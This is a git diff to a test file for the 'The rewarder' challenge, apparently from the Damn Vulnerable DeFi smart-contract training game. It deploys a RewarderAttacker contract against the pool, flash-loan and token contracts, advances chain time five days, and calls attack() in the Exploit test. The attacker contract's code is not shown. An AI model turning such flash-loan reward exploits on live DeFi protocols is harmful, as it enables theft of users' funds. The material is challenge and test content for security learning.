@@ -19,6 +19,7 @@ describe('[Challenge] The rewarder', function () {
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
         const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
+        const AttackerFactory = await ethers.getContractFactory('RewarderAttacker',deployer);
 
         this.liquidityToken = await DamnValuableTokenFactory.deploy();
         this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);
@@ -29,6 +30,13 @@ describe('[Challenge] The rewarder', function () {
         this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
         this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
         this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
+
+        this.attackContract = await AttackerFactory.deploy(
+            this.rewarderPool.address,
+            this.flashLoanPool.address,
+            this.liquidityToken.address,
+            this.rewardToken.address
+        )
 
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
@@ -66,6 +74,10 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //iterate to the next round 
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await this.attackContract.connect(attacker).attack();
     });
 
     after(async function () {
